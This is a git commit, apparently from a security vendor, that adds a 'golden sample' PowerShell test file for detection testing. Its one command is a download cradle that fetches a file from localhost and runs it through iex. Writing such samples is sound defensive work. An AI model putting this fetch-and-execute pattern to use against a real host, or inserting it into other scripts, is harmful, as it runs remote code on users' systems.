4f06c7785aa1fb9ae9518e580eab8b0c258d59e0
Jerry Yue <jerry_yue@trendmicro.com>
2022-07-04 16:56:09 +0800

    official samples

---
+++ powershell.cmd
@@ -0,0 +1,2 @@
+:: This is the Golden sample for TrendMicro testing purpose.
+cmd /c powershell.exe -nop iex(new-object net.webclient).downloadstring('http://127.0.0.1/TrendMicroTestVirus_CoreTec_onlyfortesting.txt')
